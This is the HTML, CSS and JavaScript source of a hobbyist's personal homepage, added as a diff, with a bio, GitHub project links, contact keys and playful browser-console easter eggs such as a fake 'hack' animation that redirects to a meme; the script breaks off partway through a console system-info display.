@@ -1,0 +1,1167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>nulsie | my web</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <style>
+        /* CSS Variables for easy color changes */
+        :root {
+            --bg-color: #2E3440;      /* Dark slate background */
+            --text-color: #D8DEE9;    /* Soft grey-white text */
+            --heading-color: #E5E9F0; /* Off-white for contrast */
+            --button-bg: #434C5E;     /* Muted slate blue */
+            --button-border: #4C566A;  /* Darker grey-blue border */
+            --button-hover: #5E81AC;  /* Soft, non-purplish blue */
+            --link-color: #ff3333;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'JetBrains Mono', monospace;
+            line-height: 1.6;
+            font-size: 14px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            
+        }
+
+        /* Header with snowy mountain background and gradient fade */
+        .header-banner {
+            height: 250px;
+            width: 100%;
+            background: url('banner.webp') no-repeat center center;
+            background-size: cover;
+            border-bottom: 2px solid var(--button-border); /* Added a subtle line since the fade is gone */
+        }
+
+        /* Main content container */
+.container {
+            max-width: 650px;
+            margin: 40px 0 40px 20px;
+        }
+
+        /* Typography */
+        h1, h2, h3 {
+            color: var(--heading-color);
+            font-weight: bold;
+            margin-bottom: 15px;
+            margin-top: 30px;
+        }
+
+        h1 {
+            font-size: 24px;
+            margin-top: 0;
+        }
+
+        h2 {
+            font-size: 20px;
+        }
+
+        p {
+            margin-bottom: 15px;
+        }
+
+        a {
+            color: var(--link-color);
+            text-decoration: none;
+        }
+
+        a:hover {
+            text-decoration: underline;
+        }
+
+        /* Custom UI Elements */
+        .fact-box, .counter-box {
+            display: flex;
+            align-items: left;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        button {
+            background-color: var(--button-bg);
+            color: var(--text-color);
+            border: 1px solid var(--button-border);
+            padding: 5px 12px;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            border-radius: 4px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background-color: var(--button-hover);
+        }
+
+        /* 88x31 Button Grid */
+        .silly-buttons {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            margin-top: 20px;
+        }
+
+        .silly-buttons img {
+            width: 88px;
+            height: 31px;
+            image-rendering: pixelated; /* Keeps old web buttons crisp */
+            border: none;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            padding: 40px 20px 20px;
+            font-size: 12px;
+            opacity: 0.7;
+        }
+        /* Writings Section Styles */
+        .article-list {
+            list-style-type: none;
+            padding: 0;
+            margin-bottom: 30px;
+            color: #D8DEE9;
+        }
+        .article-list li {
+            margin-bottom: 12px;
+            display: flex;
+            align-items: baseline;
+            gap: 15px;
+            color: #D8DEE9;
+        }
+       /* Change the article links to the soft grey-white text color */
+/* This matches the purple hover effect in your project tree */
+.article-list a:hover {
+    color: #ff3333 !important; 
+    text-decoration: underline;
+}
+
+/* Optional: Keep a hover effect so users know it's clickable */
+.article-list a:hover {
+    color: #ff3333; /* Light blue on hover */
+    text-decoration: underline;
+}
+        .article-list .date-badge {
+             /* A muted Nord blue */
+            font-size: 12px;
+            font-family: monospace;
+        }
+        
+        /* Article Reading View */
+        .article-container {
+            background-color: var(--button-bg);
+            padding: 25px;
+            border: 1px solid var(--button-border);
+            border-radius: 6px;
+            margin-bottom: 30px;
+        }
+        .article-date {
+            
+            font-size: 13px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid var(--button-border);
+            padding-bottom: 10px;
+        }
+        .article-content p {
+            margin-bottom: 15px;
+        }
+        .nav-btn {
+            background: transparent;
+            color: var(--text-color);
+            border: 1px solid var(--button-border);
+            padding: 6px 12px;
+            cursor: pointer;
+            font-family: inherit;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            transition: background 0.2s;
+        }
+        .nav-btn:hover {
+            background: var(--button-hover);
+            color: white;
+        }
+        /* Custom Code Box Styling */
+pre[class*="language-"] {
+    background: #242933 !important; /* Slightly darker than your background */
+    border: 1px solid var(--button-border);
+    border-radius: 4px;
+    padding: 15px;
+    margin: 20px 0;
+    font-size: 13px;
+}
+
+code[class*="language-"] {
+    font-family: 'JetBrains Mono', monospace !important;
+    text-shadow: none !important;
+}
+ /* ASCII Project Tree Styles */
+/* Updated ASCII Project Tree Styles */
+.terminal-box {
+    background: #242933;
+    border: 1px solid var(--button-border);
+    border-radius: 0; /* Changed from 4px to 0 for sharp corners */
+    padding: 15px;
+    margin-bottom: 30px;
+    overflow-x: auto;
+}
+        
+        #ascii-tree {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            color: var(--text-color);
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        #ascii-tree .folder {
+            color: #81A1C1; /* Nord frost blue */
+            font-weight: bold;
+        }
+
+        #ascii-tree a {
+            color: #A3BE8C; /* Nord green for files */
+            text-decoration: none;
+            cursor: pointer;
+            transition: color 0.2s;
+        }
+
+        #ascii-tree a:hover {
+            color: #ff3333; /* Purple highlight on hover */
+            text-decoration: underline;
+        }
+        
+        #ascii-tree .tree-line {
+            color: #4C566A; /* Muted tree branches */
+        }
+        /* The Shiver Effect */
+@keyframes shiver {
+    0% { transform: translate(1px, 1px) rotate(0deg); }
+    10% { transform: translate(-1px, -2px) rotate(-1deg); }
+    20% { transform: translate(-3px, 0px) rotate(1deg); }
+    30% { transform: translate(3px, 2px) rotate(0deg); }
+    40% { transform: translate(1px, -1px) rotate(1deg); }
+    50% { transform: translate(-1px, 2px) rotate(-1deg); }
+    60% { transform: translate(-3px, 1px) rotate(0deg); }
+    70% { transform: translate(3px, 1px) rotate(-1deg); }
+    80% { transform: translate(-1px, -1px) rotate(1deg); }
+    90% { transform: translate(1px, 2px) rotate(0deg); }
+    100% { transform: translate(1px, -2px) rotate(-1deg); }
+}
+
+.shiver {
+    display: inline-block; /* Required for transforms to work */
+    animation: shiver 0.2s infinite;
+    color: #BF616A; /* Optional: A soft Nord red to make it pop */
+}
+ /* The Secret Text Trick */
+.hidden-word {
+    color: var(--bg-color); /* Matches the background exactly */
+    transition: color 0.2s ease;
+    user-select: text; /* Ensures it can still be highlighted */
+}
+
+/* This makes the text pop out when the user highlights it */
+.hidden-word::selection {
+    background-color: var(--link-color); /* Uses your red accent */
+    color: #ffffff; /* White text when highlighted */
+}
+
+/* Optional: Reveal on hover if you want it to be slightly easier */
+.hidden-word:hover {
+    cursor: help;
+    /* Uncomment the line below if you want it to show on hover too */
+    /* color: var(--text-color); */
+}
+ /* Add to your <style> block */
+.toggle-btn {
+    cursor: pointer;
+    user-select: none;
+    transition: color 0.2s;
+}
+
+.toggle-btn:hover {
+    color: #E5E9F0; /* Brighter highlight on hover */
+}
+/* ASM Interactive Styling */
+/* ASM Interactive Styling - Blue to Red Shift */
+/* ASM - The "Breakpoint" Style */
+.asm-word {
+    color: #151b54; /* Nord Blue */
+    font-weight: bold;
+    cursor: crosshair;
+}
+
+.asm-word:hover {
+    color: #fff;
+    background-color: #2E3440; /* Nord Yellow highlight */
+}
+
+.asm-word::before { content: "asm"; }
+.asm-word:hover::before { content: "0x41534D"; } /* INT 3 / Breakpoint */
+
+/* Brainfuck - The "Memory Glitch" Style */
+.bf-word {
+    color: #ff0000; /* Nord Purple */
+    font-weight: bold;
+    cursor: help;
+}
+
+.bf-word:hover {
+    color: #ECEFF4;
+    background-color: #d1001f; /* Nord Red highlight */
+    text-transform: lowercase;
+}
+
+.bf-word::before { content: "brainfuck"; }
+.bf-word:hover::before { content: "[->+<]>"; } /* BF Pointer logic */
+
+.html-word {
+    color: #E34C26;
+}
+.css-word {
+    color: #1572B6;
+    font-weight: bold;
+}
+.js-word {
+    color: #FFDE21;
+    font-weight: bold;
+}
+.dual-tone {
+    display: inline-flex;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+/* First half of the word */
+.dual-tone::before {
+    content: attr(data-first);
+    color: #FFD43B;
+    font-weight: bold;
+}
+
+/* Second half of the word */
+.dual-tone::after {
+    content: attr(data-second);
+    color: #1572B6; /* Nord Blue */
+}
+
+/* Global rule to ensure no animations if any exist elsewhere */
+.asm-word, .bf-word {
+    transition: none !important;
+}
+.bash {
+    
+    color: #00853F;
+}
+ /* New wrapper to hold everything */
+.layout-wrapper {
+    display: flex;
+    justify-content: flex-start; /* Keeps content left */
+    align-items: flex-start;
+    gap: 40px; /* Space between text and image */
+}
+
+ /* New sidebar group to handle vertical stacking */
+.sidebar-group {
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start; /* Aligns button to the left side under the pic */
+    gap: 30px;               /* Space between the pic and the button */
+    margin-top: 40px;        /* Moves the top margin here for alignment */
+}
+
+/* Update your existing class to remove the top margin */
+.right-sidebar-img {
+    margin-top: 0;           /* Removed since parent now handles it */
+    max-width: 250px;
+    border-radius: 0;
+    box-shadow: 12px 12px 0px 0px #1a1e25;
+    background-color: var(--bg-color);
+}
+    </style>
+</head>
+<body>
+    <div id="main-page">
+        <div class="header-banner"></div>
+        
+ <div class="layout-wrapper">
+        <main class="container">
+            <h1>nulsie <img src="loader.gif"></h1>
+            <p><img src="hey.gif"> i'm just a guy interested in coding and computer science in general. i spend my time on full-stack development, pen-ops(my term for penetration), networking, Linux-related things, hard/soft modding, electric-stuff and in random fields of cs, i'm proficient in the holy trinity of web dev; <span class="html-word">html</span>, <span class="css-word">CSS</span> and <span class="js-word">JS</span>, then <span class="dual-tone" data-first="Py" data-second="thon"></span>, and a bunch of other languages, dabbles a bit with <span class="asm-word"></span> and stuff. fun fact: i had once even dabbled with <span class="bf-word"></span> but stopped in a week. i always try(although not always successful) to make the web successfully do almost anything which is possible in cs, like <b>PIES</b>, which proved that you could make apps which are virtually unhackable in web, contrasting the usual assumption that web is less safer than systems. at the same time i like to hack, break and disassemble network, web infrastructures and apps to make them better, safer and more than anything, open-source.</p>
+        <p>i'm also a big fan of <img src="web3.gif">(as seen in my projects like <b>EtCAN</b>) and you can see a recurrence of the use of decentralization in most of my projects, as i think it's where us the indies get the independence(only if done correctly) even though i don't really think Web3 would take-off that fast. </p><p>it's obvious that i'd be more than interested in the interconnected network(aka the <img src="internet.gif">). people might say <img src="arpanet.gif">ARPANET laid the foundation, but internet made everything <b>ACTUALLY</b> accessible. and my pings of gratitude to the internet is enough for bringing an entire website down(no need of botnets). i think i've had a natural talent in hosting stuff on the internet since i had an interest in these sort of things. in the internet i'm obviously interested in the server-side tech and i'm interested in the protocols which makes the whole thing work. and if you ask me what i'm interested most IN the server-side tech, i really just don't know, but i'd bet that i like the set-up process of it and playing on pushing the limits of hosting, and more than that, i think i'm interested in the system of data being transmitted and managed in these servers <img src="connection.gif">, my main things being researching on bypassing the annoying protocols and headers to freely transmit data(as seen in my projects like, again EtCAN and <b><a href="https://github.com/Gili-Net/GiliFeed-Project">GiliFeed</a></b>), i know the protocols are there because of security issues but still cmon. yet i think it is important to say what i hate the most, atleast for now, and it is that how difficult it is to pull and share data because of the increasingly rigid rate-limiting of big-tech(notably Reddit and Twitter, fuck you X).
+            </p>
+            
+            <p>apart from web and net, i'm interested in <img src="6124995.ico"><span style="color: #FFDE21;">Linux</span>(obviously i'm a Linux user and daily-drive Linux), modding Linux, <span class="bash">$ ./bash</span> scripting and other Linux stuff. I could also be considered a <b>reverse-engineering</b> guy, entry-level at best. then i dabble a bit with <b>operating system development</b>, <b>kernel development</b> (i personally think they are two different things) and other system-level stuff. other than all the virtual things, i really like the electronic/hardware part too, and i play a lot with <b>mmicrocontrollers</b>(aww) and <b>SBCs</b>. and like every good ol' cyber-junkie, i like <b>PC building</b> and <b>overclocking</b>.</p>
+            <p>i'm also the founder of <a href="https://gilinet-core.github.io/website">GiliNet</a>, a mass decentralized, collaboration community launched to develop, maintain, inspect, decompile and to protect open source projects and security infrastructures.</p>
+
+            <h2>Useless fact</h2>
+            <div class="fact-box">
+    <span id="secret-trigger">
+        this page has secrets...<img src="secret.gif">
+        <span class="hidden-word">check the source genius!</span>
+    </span>
+</div>
+
+            <div class="container">
+                <h2>Writings</h2>
+                <ul id="article-list" style="list-style: none; padding: 0;"></ul>
+                <div id="more-articles-container" style="margin-top: 20px; display: none;">
+        <a href="javascript:void(0)" id="more-articles-btn" style="color: var(--link-color); text-decoration: none; font-size: 14px;">
+            [+] More articles... </a>
+    </div>
+            </div>
+            
+<div class="container">
+    <h2>Project Briefs</h2>
+    <ul id="project-brief-list" style="list-style: none; padding: 0; line-height: 1.8;">
+        </ul>
+        <p>there are some more but they're pretty old or are of minor importance.</p>
+</div>
+
+            <div class="container">
+                <h2>Projects Directory(For Raw Source)</h2>
+                <p>Click on any file to download the source directly from the browser memory.</p>
+                <div class="terminal-box">
+<pre id="ascii-tree">
+<span class="folder toggle-btn" onclick="toggleDir('dir-root', this)">[+] projects/</span><span id="dir-root" style="display: none;">
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-etcan', this)">[+] EtCAN/</span><span id="dir-etcan" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/EtCAN/blob/main/index.html?raw=true">index.html</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/EtCAN/blob/main/script.js?raw=true">script.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/EtCAN/blob/main/README.md?raw=true">README.md</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/EtCAN/blob/main/LICENSE?raw=true">LICENSE</a></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-lyca', this)">[+] LycaClient/</span><span id="dir-lyca" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/privacy_policy.txt?raw=true">privacy_policy.txt(it's kinda non-existent)</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/LICENSE.txt?raw=true">LICENSE.txt</a>
+<span class="tree-line">│   ├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-v13', this)">[+] v1.3/</span><span id="dir-v13" style="display: none;">
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/index.html?raw=true">index.html</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/script.js?raw=true">script.js</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/style.css?raw=true">style.css</a>
+<span class="tree-line">│   │   └──</span> <a href="https://github.com/nulsie/LycaClient/blob/v1.3/README.md?raw=true">README.md</a></span>
+<span class="tree-line">│   ├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-v12', this)">[+] v1.2/</span><span id="dir-v12" style="display: none;">
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.2/index.html?raw=true">index.html</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.2/script.js?raw=true">script.js</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.2/style.css?raw=true">style.css</a>
+<span class="tree-line">│   │   └──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.2/README.md?raw=true">README.md</a></span>
+<span class="tree-line">│   ├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-v11', this)">[+] v1.1/</span><span id="dir-v11" style="display: none;">
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.1/index.html?raw=true">index.html</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.1/script.js?raw=true">script.js</a>
+<span class="tree-line">│   │   ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.1/style.css?raw=true">style.css</a>
+<span class="tree-line">│   │   └──</span> <a href="https://github.com/nulsie/LycaClient/blob/v.1.1/README.md?raw=true">README.md</a></span>
+<span class="tree-line">│   └──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-feather', this)">[+] Feather/</span><span id="dir-feather" style="display: none;">
+<span class="tree-line">│       ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v-Feather/index.html?raw=true">index.html</a>
+<span class="tree-line">│       ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v-Feather/script.js?raw=true">script.js</a>
+<span class="tree-line">│       ├──</span> <a href="https://github.com/nulsie/LycaClient/blob/v-Feather/style.css?raw=true">style.css</a>
+<span class="tree-line">│       └──</span> <a href="https://github.com/nulsie/LycaClient/blob/v-Feather/README.md?raw=true">README.md</a></span></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-coldstrain', this)">[+] ColdStrain/</span><span id="dir-coldstrain" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/ColdStrain/blob/main/ColdStrain.js?raw=true">ColdStrain.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/ColdStrain/blob/main/DISCLAIMER.md?raw=true">DISCLAIMER.md</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/ColdStrain/blob/main/DOCS.md?raw=true">DOCS.md</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/ColdStrain/blob/main/LICENSE.txt?raw=true">LICENSE.txt</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/ColdStrain/blob/main/README.md?raw=true">README.md</a></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-pies', this)">[+] PIES/</span><span id="dir-pies" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIES/blob/main/PIES.html?raw=true">PIES.html</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIES/blob/main/crypto-js.min.js?raw=true">crypto-js.min.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIES/blob/main/3.4.17?raw=true">3.4.17</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIES/blob/main/README.md?raw=true">README.md</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/PIES/blob/main/LICENSE?raw=true">LICENSE</a></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-tish', this)">[+] TISH/</span><span id="dir-tish" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/index.html?raw=true">index.html</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/script.js?raw=true">script.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/style.css?raw=true">style.css</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/scanner.js?raw=true">scanner.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/docs.html?raw=true">docs.html</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/TISH/blob/main/README.md?raw=true">README.md</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/TISH/blob/main/LICENSE?raw=true">LICENSE</a></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-piesimg', this)">[+] PIESImages/</span><span id="dir-piesimg" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIESImages/blob/main/PIESImages.html?raw=true">PIESImages.html</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIESImages/blob/main/crypto-js.min.js?raw=true">crypto-js.min.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIESImages/blob/main/3.4.17?raw=true">3.4.17</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/PIESImages/blob/main/README.md?raw=true">README.md</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/PIESImages/blob/main/LICENSE.txt?raw=true">LICENSE.txt</a></span>
+<span class="tree-line">├──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-flatbread', this)">[+] Flatbread.js/</span><span id="dir-flatbread" style="display: none;">
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/Flatbread.js/tree/main/buttons">buttons</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/Flatbread.js/blob/main/flatbread.js?raw=true">flatbread.js</a>
+<span class="tree-line">│   ├──</span> <a href="https://github.com/nulsie/Flatbread.js/blob/main/README.md?raw=true">README.md</a>
+<span class="tree-line">│   └──</span> <a href="https://github.com/nulsie/Flatbread.js/blob/main/database.json?raw=true">database.json</a></span>
+<span class="tree-line">└──</span> <span class="folder toggle-btn" onclick="toggleDir('dir-stan', this)">[+] STAN/</span><span id="dir-stan" style="display: none;">
+<span class="tree-line">    ├──</span> <a href="https://github.com/nulsie/DevRepoComplete/blob/PIES/STAN.zip">STAN.zip</a>
+<span class="tree-line">    └──</span> <a href="https://github.com/nulsie/DevRepoComplete/blob/PIES/LICENSE.txt?raw=true">LICENSE.txt</a></span></span>
+</pre>
+                </div>
+            </div>
+            <h2>COMM-LINKS</h2>
+            <p>Contact me only by Discord or Matrix, and i don't use e-mail because i only like quick disposable conversations and e-mails are not that disposable. if you're sending something <span class="shiver">sensitive</span>, use PGP or AGE and use the keys provided and i prefer Matrix.</p>
+            <a href="https://discord.com/users/1453406605461815430"><img src="button44.gif"></a>
+        <a href="https://matrix.to/#/@nulsie:matrix.org"><img src="matrix.png"></a>
+        
+        <p><a class="link-text" href="PUBLIC_KEY.asc">PUBLIC_KEY.asc</a></p>
+        <div class="terminal-box"><p>AGE KEY: age16em7p2ucvcuwd0u90k5y6lfw5gdw6qrk6qayuvrt0gjymeh9uecswspvxz</p></div>
+        
+        <h2>Linkback</h2>
+            <p>if you'd like to link back to my site, feel free to use the button below. just copy the snippet into your own code.</p>
+            
+<pre><code class="language-html">&lt;a href="https://nulsie.mywire.org" target="_blank"&gt;
+    &lt;img src="https://nulsie.mywire.org/btn.png" alt="nulsie"&gt;
+&lt;/a&gt;</code></pre>
+            
+        
+        
+           <a href="https://nulsie.mywire.org">
+  <img src="btn.png">
+        
+    </a>
+        <a href="https://dynu.com/en-us">
+            <img src="dynubtn.png">
+        </a>
+        <img src="dapp.png">
+        <a href="https://nixos.org">
+            <img src="nix.png">
+        </a>
+        <a href="https://ipfs.tech">
+            <img src="ipfs.gif">
+        </a>
+        
+       
+            
+        </main>
+        <div class="sidebar-group">
+        <div class="right-sidebar-img">
+        <img src="pic.jpg" style="width: 100%;">
+    </div>
+    <iframe src="//incr.easrng.net/badge?key=changeme" style="background: url(//incr.easrng.net/bg.gif)" title="increment badge" width="88" height="31" frameborder="0"></iframe>
+        </div>
+    
+ </div>
+
+        <footer>
+    Last deployed: {{DEPLOY_TIMESTAMP}}<br>
+    Web design is my passion. Copyleft 2026.
+</footer>
+    </div> <div id="article-page" style="display: none;">
+        <div class="container">
+            <button onclick="closeArticle()" style="background: none; border: 1px solid var(--button-border); color: var(--text-color); cursor: pointer; padding: 5px 10px; margin-bottom: 20px; font-family: inherit;">
+                ← Back
+            </button>
+            <h1 id="article-title" style="color: var(--heading-color); margin-bottom: 10px;"></h1>
+            <div id="article-date" style="color: var(--link-color); font-size: 12px; margin-bottom: 30px; font-family: monospace;"></div>
+            <div id="article-content"></div>
+        </div>
+    </div>
+</body>
+<script>
+    
+    // ==========================================
+    // 1. FLEON ORACLE (Magic 8-Ball)
+    // Usage: Type `f8ball.will_i_be_rich` in console
+    // ==========================================
+    const responses = [
+        "%c YES. %c The market trends agree.",
+        "%c NO. %c Liquidate your positions immediately.",
+        "%c MAYBE. %c The alpha is currently redacted.",
+        "%c CERTAINLY. %c High-velocity gains detected.",
+        "%c DOUBTFUL. %c Status: Bag-holding imminent."
+    ];
+
+    const styles = [
+        "color: #2ecc71; font-weight: bold; background: #111; padding: 2px 5px;", // Green
+        "color: #e74c3c; font-weight: bold; background: #111; padding: 2px 5px;", // Red
+        "color: #f1c40f; font-weight: bold; background: #111; padding: 2px 5px;", // Yellow
+        "color: #3498db; font-weight: bold; background: #111; padding: 2px 5px;", // Blue
+        "color: #9b59b6; font-weight: bold; background: #111; padding: 2px 5px;"  // Purple
+    ];
+
+    window.f8ball = new Proxy({}, {
+        get: function(target, prop) {
+            const question = prop.replace(/_/g, ' ') + "?";
+            const randomIndex = Math.floor(Math.random() * responses.length);
+            const [answerText, metaText] = responses[randomIndex].split(' %c ');
+
+            console.log(`%c 🎱 FLEON ORACLE: %c ${question}`, "color: white; font-weight: bold;", "color: #888;");
+            console.log(answerText + " %c " + metaText, styles[randomIndex], "color: #aaa; font-style: italic;");
+            
+            return "--- fleon.js oracle output ---";
+        }
+    });
+
+    // ==========================================
+    // 2. NEON WEBRING
+    // Usage: Type `net.list`, `net.random`, `net.hack`, or `net.textbased`
+    // ==========================================
+    const webringData = [
+        { name: "Lili", niche: "Idk myself, i think cats, anyway she hates dogs", url: "https://lili.lgbt " },
+        { name: "Dominique aka sdomi", niche: "reverse-engineering, networks, electronics, osdev, and retrocomputing", url: "https://sdomi.pl " },
+        { name: "CozyNet", niche: "Random Stuff", url: "https://cozynet.org " },
+        { name:"760ceb3b9c0ba4872cadf3ce35a7a494", niche: "rlly idk", url: "https://760ceb3b9c0ba4872cadf3ce35a7a494.neocities.org/ " },
+        { name: "Famfo", niche: "Computer talk", url: "https://famfo.xyz " }, 
+        { name: "Lina", niche: "Exposé", url: "https://lina.sh " }, 
+        { name: "Fabi", niche: "Dev stuff", url: "https://coinflipcoder.dev " }, 
+        { name: "BlueFox", niche: "Hacking", url: "https://rexbluefox.dev " }, 
+        { name: "Lilly Schramm", niche: "Web Development and some other web stuff ig", url: "https://eps-dev.de " }
+    ];
+
+    Object.defineProperty(window, 'net', {
+        get: function() {
+            return new Proxy({}, {
+                get: (target, prop) => {
+                    if (prop === 'list') {
+                        console.clear();
+                        console.log("%c NEON WEBRING | ACTIVE NODES ", "color: white; background: #3498db; font-weight: bold; padding: 2px 5px;");
+                        console.table(webringData);
+                        console.log("%c Type 'net.random' to jump to a random node.", "color: #888; font-style: italic;");
+                        return "--- Directory Output Complete ---";
+                    }
+
+                    if (prop === 'hack') {
+                        console.warn("CRITICAL: INITIATING OVERRIDE PROTOCOL...");
+                        let progress = 0;
+                        const interval = setInterval(() => {
+                            progress += 20;
+                            console.log(`%c [SYSTEM] Hacking mainframes... ${progress}%`, "color: #2ecc71; font-family: monospace;");
+                            
+                            if (progress >= 100) {
+                                clearInterval(interval);
+                                console.log("%c [SUCCESS] ACCESS GRANTED. REDIRECTING TO SOURCE... ", "color: white; background: #e74c3c; font-weight: bold;");
+                                setTimeout(() => {
+                                    window.location.href = "https://www.reddit.com/r/memes/comments/d9xbez/youve_been_fooled/";
+                                }, 1000);
+                            }
+                        }, 400);
+                        return "Bypassing firewalls... please wait.";
+                    }
+
+                    if (prop === 'random') {
+                        const site = webringData[Math.floor(Math.random() * webringData.length)];
+                        console.log(`%c Redirecting to: ${site.name}...`, "color: #2ecc71; font-weight: bold;");
+                        setTimeout(() => window.open(site.url, '_blank'), 1000);
+                        return `Jumping to ${site.niche}...`;
+                    }
+
+                    if (prop === 'textbased') {
+                        const destination = "https://nulsie.github.io/text";
+                        console.log(`%c U r going to the text based version of this site ${destination}...`, "color: #3498db; font-weight: bold;");
+                        setTimeout(() => {
+                            window.location.href = destination;
+                        }, 800);
+                        return "Redirecting...";
+                    }
+
+                    return undefined;
+                }
+            });
+        },
+        configurable: true,
+        enumerable: false
+    });
+
+    // ==========================================
+    // 3. NULSIE FETCH (Terminal SysInfo)
+    // Usage: Type `nulsie.fetch` in console
+    // ==========================================
+    Object.defineProperty(window, 'nulsie', {
+        get: function() {
+            return new Proxy({}, {
+                get: (target, prop) => {
+                    if (prop === 'fetch') {
+                        const ua = navigator.userAgent;
+                        const os = ua.includes("Win") ? "Windows" : 
+                                   ua.includes("Mac") ? "MacOS" : 
+                                   ua.includes("Linux") ? "Linux" : "Unknown OS";
+                        
+                        const browser = ua.includes("Firefox") ? "Firefox" : 
+                                        ua.includes("Chrome") ? "Chrome" : 
+                                        ua.includes("Safari") ? "Safari" : "Browser";
+                                        
+                        const res = `${window.screen.width}x${window.screen.height}`;
+                        const cores = navigator.hardwareConcurrency || 'Unknown';
+                        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : 'Unknown';
+                        const uptime = `${Math.floor(performance.now() / 1000)}s`;
+
+                        const art = [
+                            " ███╗   ██╗ ",
+                            " ████╗  ██║ ",
+                            " ██╔██╗ ██║ ",
+                            " ██║╚██╗██║ ",
+                            " ██║ ╚████║ ",
+                            " ╚═╝  ╚═══╝ "
+                        ];
+
+                        const info = [
+                            { l: "nulsie", v: `@${browser}`, c1: "#2ecc71", c2: "#e0e0e0" }, 
+                            { l: "----------------", v: "", c1: "#e0e0e0", c2: "" }, 
+                            { l: "OS", v: `: ${os}`, c1: "#3498db", c2: "#e0e0e0" },
